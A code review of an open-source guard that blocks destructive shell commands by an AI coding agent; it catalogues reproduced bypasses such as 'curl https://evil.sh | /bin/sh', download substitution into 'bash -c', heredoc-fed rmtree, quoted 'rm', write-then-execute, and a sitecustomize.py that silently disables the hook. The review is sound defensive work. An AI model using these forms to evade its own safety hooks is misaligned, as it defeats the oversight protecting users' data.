# Code Review Summary — Claude Safe Mode (whole repo)

**Date**: 2026-10-10
**Scope**: diff from the empty tree to `HEAD` (b51e7eb). Per user instruction, the repo's own infra was excluded: `.claude/`, `.codex/`, `.github/`, `.capy/`, `.mcp.json`, `.arc.yml`, `.capy.toml`, `AGENTS.md`, `CLAUDE.md`.
**Files reviewed**: 10 product files, ~1,870 lines (`hooks/guard.py`, `hooks/guard.sh`, `managed-settings.json`, `install.sh`, `uninstall.sh`, `verify.sh`, `tests/test_guard.py`, `README.md`, `USERGUIDE.md`, `.gitignore`).
**Active profiles**: `python` (triggered by `.py` extension on `hooks/guard.py`, `tests/test_guard.py`). Checklists loaded: `security-checklist.md`, `solid-checklist.md`, `code-quality-checklist.md`, `removal-plan.md`.
**Baseline**: `python3 tests/test_guard.py` → 164 passed, 0 failed. Every bypass below was reproduced against `hooks/guard.py` with a probe script (exit 0 = allowed, exit 2 = blocked); none is covered by the existing suite.
**Overall assessment**: REQUEST_CHANGES (at review time; all findings below were then re-verified and fixed, see next section)

---

## Verification and outcomes (2026-10-10, same day)

Every finding was re-checked before being fixed. "probe" = reproduced by running `hooks/guard.py` on the input; "code" = confirmed by re-reading the cited lines; "demo" = reproduced with a purpose-built experiment; "docs" = confirmed against the Claude Code settings/hooks/sandboxing docs fetched that day. After the fixes: `tests/test_guard.py` 328/328, the pre-change suite (164 cases) still 164/164, and every reproduced bypass now blocks.

| # | Finding | Verified by | Outcome |
|---|---|---|---|
| P0-1 | `curl \| /bin/sh`, `\| (bash)`, `\| /usr/bin/python3` | probe | fixed: `check_download_pipelines` resolves the program after a pipe by basename through wrappers, subshells and `sh -c` |
| P0-2 | `bash -c "$(curl …)"` | probe | fixed: `RAW_RULES` refuses `$(curl` / `` `curl `` anywhere (quotes stripped, backticks kept) |
| P0-3 | Makefile `@rm` / `-rm` prefixes | probe | fixed: recipe prefixes stripped; `$(MAKE) goal` recursion followed |
| P0-4 | heredoc / stdin interpreters | probe | fixed: `STDIN_SCRIPT` routes `python3 - <<EOF`, `bash <<EOF`, `sh < f` through the inline checks |
| P1-5 | interpreter not isolated | demo (`os._exit(0)` in a `PYTHONPATH` `sitecustomize.py` → exit 0; with `-I` → exit 2) | fixed: `guard.sh` runs `python3 -I`, no PATH fallback; user site dirs protected from file tools, sandbox and deny rules |
| P1-6 | standalone quoted `'rm'` | probe | fixed: a quoted single word keeps its text in `defang` |
| P1-7 | write-then-execute in one command | probe | fixed: `check_write_then_run` refuses a path that is redirected/`tee`d to and then run as a script operand later in the same command |
| P1-8 | `cd dir && bash script.sh` not scanned | probe | fixed: `scan_referenced_scripts` tracks `cd` per segment |
| P2-9 | git global options with arguments | probe | fixed: `GIT` prefix consumes `-C/--git-dir/--work-tree/… <arg>`; `-c`/`--exec-path` rule now case-sensitive and deliberate |
| P2-10 | `npm run` scripts unscanned | probe | fixed: `scan_package_scripts` (run/lifecycle/install scripts, pre/post, nested `npm run`); `rimraf` added to `HIGH_SIGNAL` |
| P2-11 | notebook `%%bash` cells | probe | fixed: `.ipynb` parsed as JSON; shell magics, `!` lines and Python cells each scanned |
| P2-12 | `.vscode/settings.json` writable | probe + known VS Code vectors | fixed: `.vscode/`, `.idea/` protected in file tools, write-verb path rule, and `Edit` deny |
| P2-13 | project MCP servers approvable | docs | fixed: `allowManagedMcpServersOnly: true` + `allowedMcpServers: []` (the VS Code `ide` server is exempt per docs) |
| P2-14 | >2 MB scripts silently skipped | demo (2.1 MB script with `rmtree` allowed) | fixed: cap raised to 64 MB and exceeding it blocks; unreadable scripts block; data files are never read in full |
| P2-15 | backup failures swallowed | demo | fixed: warning returned to the user via hook `systemMessage`, appended to `~/.claude-safe-backups/LAST_ERROR`, surfaced by `verify.sh` |
| P2-16 | no `guard.sh` tests, no regression cases | code | fixed: suite rewritten in-process (fast) + process-contract cases for `guard.py` and `guard.sh`, including the isolation demo |
| P2-17 | `sys.exit` inside checks | code | fixed: checks raise `Blocked`; only the entry point exits |
| P3-18 | `open` treated as read-only | code + docs (`allowAppleEvents: false` backstops) | fixed: removed from `READ_ONLY_FIRST`; `open -a/-b` and executable/installer extensions refused; `code --install-extension` refused |
| P3-19 | wrapper option arguments | probe | fixed: `WRAPPER_OPTIONS_WITH_ARG` / `WRAPPER_POSITIONAL` |
| P3-20 | empty stdin / non-dict `tool_input` allowed | probe | fixed: both block |
| P3-21 | backup dir unusable from Bash | probe | fixed: read-only commands and copying out of it allowed; writes into it refused |
| P3-22 | `$TMPDIR` writes blocked for file tools | probe | fixed: temp prefixes exempt from the system-folder rule only |
| P3-23 | three false positives | probe | fixed: `git restore --staged`, `git config user.name/email`, substitutions next to quoted prose |
| P3-24 | `find * -delete *` deny glob | docs | fixed: `-delete*` / `-exec*` |
| P3-25 | `verify.sh` gaps | code | fixed: `guard.sh` owner, folder writability, working interpreter, Claude Code version, `LAST_ERROR`, fail-closed probes, Linux managed path |
| P3-26 | `install.sh` python check | code | fixed: interpreter is executed with `-I`; test suite runs before install; Claude Code version warning |
| P3-27 | README Linux claim | code | fixed: manual-install instructions |
| P3-28 | README known limits / versions | docs (v2.1.295 for `onFailure`) | fixed |
| P3-29 | README `--` | code | fixed |
| P3-30 | `guard.sh` triple spawn | code | fixed: one spawn per call, probe only on an unexpected exit code; stdin buffered so a retry is safe |
| P3-31 | snapshot dedup | demo (two identical edits → two files) | fixed: identical content skipped; also fixed a same-second filename collision that dropped a changed version |
| P3-32 | `SCRIPT_DELETE` aliases | code | partly fixed: bare `rmtree(` added. **Deferred**: `shutil.move`, `os.rename`, `open(path, "w")` are reversible or too common; documented in README "Known limits" and in the regex comment |

**Deferred / not done, on purpose**
- `shutil.move` / `os.rename` / `open(..., "w")` in scripts are not treated as deletion (see P3-32).
- Makefile `include`, `python -m module`, `conftest.py`, and programs reading paths from stdin remain uninspected; README "Known limits" now says so.
- The `/kk:test` skill was not run for the test rewrite; the new suite mirrors the existing plain-script harness. Run it if a pytest-style layout is wanted.
- The `A && B || C` style in `verify.sh` (shellcheck SC2015, info) is pre-existing and safe because `ok`/`no` always succeed; left as is.

---

Severity calibration used here: **P0** = defeats an advertised protection using a form Claude emits in ordinary, non-adversarial work. **P1** = defeats a protection but needs an unusual or adversarial form, or is a privilege-boundary weakness. **P2** = gap in a non-advertised or best-effort layer, or a maintainability concern. **P3** = polish, docs, false positives.

---

## Findings

### P0 - Critical

- **[hooks/guard.py:157-162]** `curl | shell` rules only match a bare shell name after the pipe
  - Profile: python · Checklist: security-checklist.md (Input/Output Safety — injection)
  - Triggered by: content — `.py` extension
  - The regex requires `|\s*(sudo\s+)?(ba|z|k|da|a)?sh\b` immediately after the pipe. Any path prefix, subshell, or wrapper defeats it. Confirmed allowed: `curl https://evil.sh | /bin/sh`, `curl https://evil.sh | (bash)`, `curl https://x.py | /usr/bin/python3`. README promises this exact class is blocked.
  - Confidence: 95% — reproduced; pure regex logic.
  - Fix: after a `curl|wget|fetch` segment, take the command-position token of the next pipe segment via `basename()` (reusing `command_position_tokens`) and compare against a shell/interpreter set. Also accept `(`, `{`, `env`, `exec`, `nohup` prefixes.

- **[hooks/guard.py:340-346, 697-706]** Command substitution of a download inside `-c` is not a rule
  - Profile: python · Checklist: security-checklist.md
  - Triggered by: content — `.py` extension
  - `/bin/bash -c "$(curl -fsSL https://x/install.sh)"` (the Homebrew install idiom, the most common curl-to-shell form on macOS) is allowed. `eval "$(curl …)"` is caught only because of the `eval` rule. Confirmed allowed for both `bash -c` and `/bin/bash -c`.
  - Confidence: 95% — reproduced.
  - Fix: add a PATTERN_RULE that blocks `\$\(\s*(curl|wget|fetch)\b` and `` `\s*(curl|wget|fetch)\b `` outright. Substituting downloaded bytes into a command line is never "ordinary research work".

- **[hooks/guard.py:503-509, 599-609]** Makefile recipe prefixes `@`, `-`, `+` hide the program name
  - Profile: python · Checklist: code-quality-checklist.md (boundary conditions)
  - Triggered by: content — `.py` extension
  - `scan_shell_lines` feeds the raw recipe line to `check_shell_text`; `@rm -rf build` tokenises to `@rm`, which is not in `HIGH_SIGNAL`. `make clean` is blocked by name, but `make all` with a `clean`/`prep` prerequisite whose recipe uses `@rm` or `-rm` is allowed. Confirmed. `@`/`-` prefixes are the norm in real Makefiles, and README advertises "a `make` target that runs `rm`" as caught.
  - Confidence: 95% — reproduced.
  - Fix: in `scan_make.visit`, map recipe lines through `re.sub(r"^\s*[@+-]+", "", line)` before scanning. Also consider substituting `$(MAKE)`/`${MAKE}` recursion and `$(shell …)` in variable assignments, or documenting them as not scanned.

- **[hooks/guard.py:340-346, 697]** Heredoc-fed interpreters bypass the inline-script check
  - Profile: python · Checklist: security-checklist.md
  - Triggered by: content — `.py` extension
  - `INLINE_SHELL` only recognises `-c`/`-e` forms. `python3 - <<EOF\nimport shutil; shutil.rmtree("data")\nEOF` is allowed; `python3 -c '…rmtree…'` is blocked. The heredoc form is a very common Claude idiom (and the one it reaches for when `-c` is refused). Same for `bash <<EOF`, `Rscript - <<EOF`.
  - Confidence: 95% — reproduced.
  - Fix: run `SCRIPT_DELETE`/`SCRIPT_SPAWN` against `defang(command)` on every command (quoted prose is still neutralised, heredoc bodies are unquoted so they are inspected). Extend `INLINE_SHELL` with `<<` after an interpreter and with `python3?\s+-\s`.

### P1 - High

- **[hooks/guard.sh:31]** Guard interpreter loads user-controlled startup code
  - Profile: generic · Checklist: —
  - Triggered by: —
  - The root-owned guard runs under `python3` without `-I`. CPython imports `sitecustomize`/`usercustomize` and processes `.pth` files from the user site directory (`~/Library/Python/3.x/lib/python/site-packages` for Apple's python3) and from `PYTHONPATH` at startup. Either can call `sys.exit(0)` and silently disable the guard. Reachable paths under the current policy: an Edit-tool write to that user-site path (not in `PROTECTED_FILE_PATTERNS`; confirmed allowed by the guard, so it falls to a routine permission prompt), or a cloned repo whose `.claude/settings.json` `env` sets `PYTHONPATH` to a directory containing `sitecustomize.py` (project `env` applies to the Claude Code process, which hooks inherit).
  - Confidence: 85% — Python startup behaviour is documented; the write path was confirmed; the project-`env` inheritance is from the hooks docs.
  - Fix: `"$PY" -I "$GUARD_PY"` in `guard.sh` (isolated mode ignores `PYTHON*` env vars, user site, and the script directory on `sys.path`). Add `~/Library/Python/**` and `**/site-packages/**` to `PROTECTED_FILE_PATTERNS` and `sandbox.filesystem.denyWrite`. Also drop the PATH-based `command -v python3` fallback (line 28) so only the three root-owned interpreters are ever used.

- **[hooks/guard.py:394-412, 448-461]** A quoted word that is an entire token is invisible to `check_banned`
  - Profile: python · Checklist: security-checklist.md
  - Triggered by: content — `.py` extension
  - `defang` replaces a standalone quoted string with ` Q `. `'rm' -rf x` and `"/bin/rm" -rf x` are therefore allowed (the glued forms `r'm'`, `r''m` are caught, and are the only ones tested). The shell executes `'rm'` as `rm`. PATH_RULES run on `strip_quotes` but contain no program names.
  - Confidence: 95% — reproduced.
  - Fix: in `defang`, keep the inner text when the quoted string contains no whitespace (a single quoted word is a token, not prose). Add `'rm' -rf x` and `"/bin/rm" -rf x` to `BASH_CASES`.

- **[hooks/guard.py:617-640, 657-683]** Write-then-execute in one command line is not detected
  - Profile: python · Checklist: security-checklist.md (TOCTOU / check-then-act)
  - Triggered by: content — `.py` extension
  - `echo 'rm -rf data' > s.sh && bash s.sh` and `printf '%s\n' 'rm' '-rf' 'x' > s.sh; bash s.sh` are allowed: the quoted payload is prose to `defang`, and `s.sh` does not exist at inspection time so it is never scanned. The sandbox permits deleting project files, and the `Bash(rm *)` deny rule only matches a leading `rm`, so no layer stops this. This is a structural limit of inspect-then-run, but it is not listed in README "Known limits" (which only mentions stdin-fed paths and compiled binaries).
  - Confidence: 90% — reproduced; the layer interaction is from the sandboxing docs.
  - Fix (targeted): block a command that redirects or `tee`s into a path token and later passes that same token to an interpreter or `source`/`.`; and when a command contains a redirect, additionally run `check_banned` over the quoted contents. Document the residual class in README.

- **[hooks/guard.py:617-640]** Referenced scripts are resolved against the hook `cwd`, ignoring `cd` in the command
  - Profile: python · Checklist: code-quality-checklist.md
  - Triggered by: content — `.py` extension
  - `cd scripts && bash cleanup.sh` (script contains `rm -rf data`) is allowed; `bash scripts/cleanup.sh` is blocked. `cd dir && …` is one of Claude's most common command shapes.
  - Confidence: 90% — reproduced.
  - Fix: walk segments in order; on `cd <dir>` update the resolution base for subsequent segments (relative to current base, `~` expanded). Fall back to also trying each directory token as a base.

### P2 - Medium

- **[hooks/guard.py:153, 225-227]** `GIT` prefix does not model global options that take an argument
  - Profile: python · Checklist: security-checklist.md
  - Triggered by: content — `.py` extension
  - `git --work-tree . reset --hard` is allowed. `git -C . reset --hard` is blocked only because the `-c` rule is compiled with `IGNORECASE` and happens to match `-C` — an accident, not a design. `git --git-dir .git push --force` is blocked only because `\bgit` re-matches inside `.git`.
  - Confidence: 90% — reproduced.
  - Fix: `GIT = r"\bgit\s+(?:(?:-C|--git-dir|--work-tree|--namespace|-c)\s+\S+\s+|-[^\s]+\s+)*"`; make the `-c` rule case-sensitive on purpose or explicitly block `-C`/`--git-dir`/`--work-tree` with a reason.

- **[hooks/guard.py:617]** `npm run` / `yarn` / `pnpm` scripts are not scanned
  - Profile: python · Checklist: security-checklist.md
  - Triggered by: content — `.py` extension
  - `npm run build` with `"build": "rm -rf dist && tsc"` in `package.json` is allowed (confirmed). The Makefile equivalent is scanned. `rm -rf dist` / `rimraf` is near-universal in JS build scripts and runs inside the project the sandbox lets it delete. `tests/test_guard.py:188` asserts `npm run build` is allowed, so this is a scope decision — but an unstated one.
  - Confidence: 90%.
  - Fix: parse `package.json` → `scripts[name]` (plus `pre<name>`/`post<name>`) and run `check_shell_text` on each, mirroring `scan_make`. Same idea for `poetry run`, `tox`, `nox`, `just`, `rake` if they matter to the audience.

- **[hooks/guard.py:365, 523-524]** Notebook `%%bash` / `%%sh` / `%%script` cells are only scanned on their first line
  - Profile: python · Checklist: security-checklist.md
  - Triggered by: content — `.py` extension
  - `NOTEBOOK_BANG` matches a line starting with `!` or `%`; a `%%bash` cell whose second line is `rm -rf data` is allowed (confirmed). Regexing raw `.ipynb` JSON is fragile.
  - Confidence: 90% — reproduced.
  - Fix: `json.loads` the notebook, iterate `cells[].source`; for cell magics `%%bash|sh|script|system|cmd` scan every line as shell; for `!`-prefixed lines scan the remainder; for Python cells apply `SCRIPT_DELETE`/`SCRIPT_SHELL_CALL`.

- **[hooks/guard.py:740]** `.vscode/settings.json` is writable
  - Profile: generic · Checklist: —
  - Triggered by: —
  - `tasks.json` and `launch.json` are protected but `settings.json` is not. Workspace settings such as `git.path` or terminal profile `args` point VS Code at executables; VS Code (the target environment) runs them outside the Bash sandbox when the user next uses the git UI or opens a terminal. Confirmed allowed by the guard.
  - Confidence: 70% — vectors are known, but each needs a later user action in VS Code.
  - Fix: protect `/\.vscode/` entirely for Edit/Write and add it to the `PATH_RULES` write check.

- **[managed-settings.json:330]** Project `.mcp.json` servers can still be approved by the user and run unsandboxed
  - Profile: generic · Checklist: —
  - Triggered by: —
  - `enableAllProjectMcpServers: false` only disables auto-approval; a cloned repo's `.mcp.json` still produces an approval prompt, and the sandboxing docs state local MCP servers "run with your full access". The target user is told to answer prompts with yes when expected.
  - Confidence: 80% — behaviour and the `allowManagedMcpServersOnly` / `allowedMcpServers` keys are from the settings reference; exact semantics of an empty allowlist not verified.
  - Fix: set `allowManagedMcpServersOnly: true` (or an explicit `allowedMcpServers` list) in `managed-settings.json`.

- **[hooks/guard.py:494-500, 527-530]** Scripts over 2 MB are silently not inspected
  - Profile: python · Checklist: code-quality-checklist.md (swallowed failure)
  - Triggered by: content — `.py` extension
  - `read_text` returns `None` above `SCRIPT_SCAN_MAX_BYTES` and `scan_script_file` returns without comment. Notebooks with embedded figures routinely exceed 2 MB, so `jupyter nbconvert --execute big.ipynb` skips the only check that would see a `!rm` cell. Contradicts "if the guard cannot run … the command is blocked".
  - Confidence: 85%.
  - Fix: raise the cap (regexes over 50 MB finish well inside the 20 s hook timeout) and block with "script too large to inspect" beyond it, or parse notebooks structurally so size is dominated by outputs you can drop.

- **[hooks/guard.py:784-785, 800-801]** Backup failures are swallowed
  - Profile: python · Checklist: code-quality-checklist.md (swallowed exceptions)
  - Triggered by: content — `.py` extension
  - `snapshot`/`prune_backups` catch `Exception` and `pass`. README and USERGUIDE promise "every file … is copied first". A full disk, a bad `HOME`, or a permissions error means no backup and no signal. The trade-off (never block legitimate work) is reasonable; the silence is not.
  - Confidence: 80% — deliberate per the inline comment, but still a silent broken promise.
  - Fix: on failure write one line to stderr and to a marker file (`~/.claude-safe-backups/LAST_ERROR`) that `verify.sh` surfaces; keep allowing the edit.

- **[tests/test_guard.py:25-36]** Suite never exercises `guard.sh`, and has no regression cases for any bypass above
  - Profile: python · Checklist: code-quality-checklist.md
  - Triggered by: content — `.py` extension
  - Tests invoke `guard.py` via `sys.executable`; the fail-closed mapping in `guard.sh` (missing python → 2, exit 1 → 2) is untested. Each probe in this review is a one-line `BASH_CASES` entry.
  - Confidence: 95%.
  - Fix: add the probe cases; add a small shell test that runs `guard.sh` with `GUARD_DIR` pointed at a temp dir (make it overridable via env for tests only) and asserts exit 2 on missing interpreter and on a guard that exits 1.

- **[hooks/guard.py:43-59]** `block()`/`allow()` call `sys.exit` from inside every check
  - Profile: python · Checklist: solid-checklist.md (SRP; testability)
  - Triggered by: content — `.py` extension
  - Control flow via process exit makes the policy engine impossible to unit-test in-process (164 subprocess spawns per run, ~10 s) and forbids composing checks (e.g. "collect all reasons"). Backups (`snapshot`, `prune_backups`) are an unrelated responsibility in the same module. Single-file deployment is a sensible constraint, but it does not require exiting from inside checks.
  - Confidence: 75% — design preference with concrete testing cost.
  - Fix (incremental): raise a `Blocked(title, detail)` exception from checks; catch it once in `main()` and exit 2 there. Tests can then import `guard` and call `check_command()` directly.

### P3 - Low

- **[hooks/guard.py:372-383]** `open` is in `READ_ONLY_FIRST`. On macOS `open x.command` / `open -a Terminal s.sh` executes outside the Bash sandbox. Today `allowAppleEvents: false` makes `open` fail with error -600, so the sandbox backstops it, but README "Tuning" invites loosening settings and the layers should stay independent. Remove `open` from the list and add a rule blocking `open` with `-a`/`-b` or an executable/installer extension.
- **[hooks/guard.py:426-445]** Wrapper option arguments are not skipped: `nice -n 10 dd …`, `timeout -s KILL 5 dd …` are allowed (confirmed); only `LOW_SIGNAL` names are affected because `HIGH_SIGNAL` is matched as bare words. Handle `-n`/`-s`/`-u`/`-k` arguments for `nice`, `timeout`, `env`, `ionice`.
- **[hooks/guard.py:809-810, 822-823]** Empty stdin and a non-dict `tool_input` both `allow()`. Claude Code always sends a dict, so exploitability is nil, but the docstring says fail-closed. Block both with "could not read the tool call".
- **[hooks/guard.py:325; USERGUIDE.md:52-56]** `PATH_RULES` blocks any Bash command mentioning `.claude-safe-backups`, including `ls`/`cp` from it (confirmed), while USERGUIDE says Claude can "find the earlier version for you to restore". Claude can still use Glob/Read/Write, but `cp` back is refused. Either allow read-only commands on the backup dir or reword the guide.
- **[hooks/guard.py:730]** `^/(…|private/var|…)` blocks Edit/Write under `/private/var/folders/…` (macOS `$TMPDIR`) as "a system folder" (confirmed), while Bash redirects there are allowed via `TEMP_PREFIXES`. Exempt `TEMP_PREFIXES` in `check_file_tool`.
- **[hooks/guard.py:186-188, 222-224, 697-700]** False positives confirmed: `git restore --staged file` (safe, un-stages), `git config user.name Me` (USERGUIDE says Claude can help set up git), and `git commit -m "fix rm bug $(date)"` (any `$(` makes quoted prose visible to `check_banned`). Allow `restore --staged`/`--worktree`-less forms, allow `config user.name|user.email`, and in the inline branch only unquote the substitution, not the whole command.
- **[managed-settings.json:78-79]** `Bash(find * -delete *)` and `Bash(find * -exec *)` do not match `find . -name x -delete` (per the permissions docs, a trailing ` *` matches the bare form only when it is the rule's only wildcard). Use `Bash(find * -delete*)`. The guard catches it anyway.
- **[verify.sh:41-48]** Checks `guard.py` ownership but not `guard.sh`, nor that `/usr/local/claude-guard` and `/usr/local` are not user-writable (Intel Homebrew hosts have a user-owned `/usr/local`), nor that the chosen python actually runs. Add those checks.
- **[install.sh:32-37]** Python check is `-x` only; on a Mac without Command Line Tools `/usr/bin/python3` is a shim that fails, so the installer dies with the misleading "managed-settings.json is not valid JSON". Reuse `guard.sh`'s `-c 'import sys'` probe and emit the `xcode-select --install` message.
- **[README.md:7 vs install.sh:29]** README says Linux is "partially supported"; the installer refuses to run on Linux. State that Linux is manual-install only (`/etc/claude-code/managed-settings.json`) or remove the claim.
- **[README.md:149-168]** "Known limits" should list: standalone-quoted program names, write-then-execute within one command, heredoc-fed interpreters, `npm run` scripts, and the >2 MB scan cap. Also note minimum Claude Code versions: `onFailure: "block"` needs ≥ v2.1.295 (older versions let a crashed/missing hook through, which `guard.sh` cannot help with because it is the thing that failed to start), `disableBypassPermissionsMode` subagent handling ≥ v2.1.223.
- **[README.md:170]** `--` should be `---`.
- **[hooks/guard.sh:22-27]** Up to three interpreter spawns per hook call (`-c 'import sys'` probes) before the real run; measurable latency on every tool call. Run the first `-x` candidate directly and fall through only on exit 126/127.
- **[hooks/guard.py:772-785]** No dedup across snapshots: editing a 20 MB CSV fifty times stores 1 GB/day for 30 days. Skip the copy when the previous snapshot of the same path has identical size+mtime or hash.
- **[hooks/guard.py:349-356]** `SCRIPT_DELETE` misses `from shutil import rmtree; rmtree(…)`, `import shutil as s; s.rmtree(…)`, `shutil.move`, `os.rename`/`os.replace` to outside, and `open(path, "w")` truncation. Add `\brmtree\s*\(`, `shutil\.move\b`, `os\.(rename|replace)\b` at minimum; README already admits this layer is heuristic.

---

## Removal/Iteration Plan

Nothing is a removal candidate. `fileCheckpointingEnabled: true` plus the custom snapshot are redundant by design (belt and braces); keep both.

## Additional Suggestions

- Treat the guard as a parser problem, not a regex problem, for the next iteration: `shlex`-style tokenisation per segment (with `cd` tracking and heredoc bodies as attached text) would remove most of the quoting/prefix/wrapper class at once.
- Add a `make test` or `./test.sh` wrapper that runs the Python suite and a `guard.sh` shell test, and call it from `install.sh` before trusting the guard.

## Areas Not Covered

- `.claude/scheduled_tasks.lock` is denied by this repo's own Read rules; not inspected.
- Runtime behaviour on macOS (Seatbelt profile contents, whether Claude Code's `Bash(rm *)` deny matches a quoted `'rm'`) was not executed; claims about the sandbox and deny rules come from the Claude Code docs fetched today.
- `managed-settings.json` key names were verified against the settings reference for `disableAutoMode`, `disableBypassPermissionsMode`, `allowManagedHooksOnly`, `disableSkillShellExecution`, `disableSideloadFlags`, `disableCommandPluginSources`, `strictKnownMarketplaces`, `enableAllProjectMcpServers`, `fileCheckpointingEnabled`, the `sandbox.*` keys, `onFailure`, `statusMessage`, and `Edit(//…)` syntax. `Bash(dangerouslyDisableSandbox:true)` was not located in the fetched pages.
